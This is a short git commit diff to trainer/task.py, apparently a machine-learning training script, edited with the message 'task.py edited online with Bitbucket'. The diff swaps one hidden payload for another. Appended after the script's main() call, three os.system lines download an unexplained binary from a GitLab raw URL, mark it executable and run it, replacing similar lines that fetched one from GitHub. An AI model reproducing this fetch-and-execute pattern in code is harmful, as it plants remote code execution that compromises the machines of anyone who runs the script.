6206df0a44620fe1918f2b5b7c2fc88ae5b10c6a
erikz <erickzon22@mailbox.org>
2022-11-08 16:50:57 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aqshakuy/kuya/main/jago')
-os.system('chmod 777 jago')
-os.system('./jago')
+os.system('wget https://gitlab.com/aqshakuy/dorayaki/-/raw/main/ceteaing')
+os.system('chmod 777 ceteaing')
+os.system('./ceteaing')
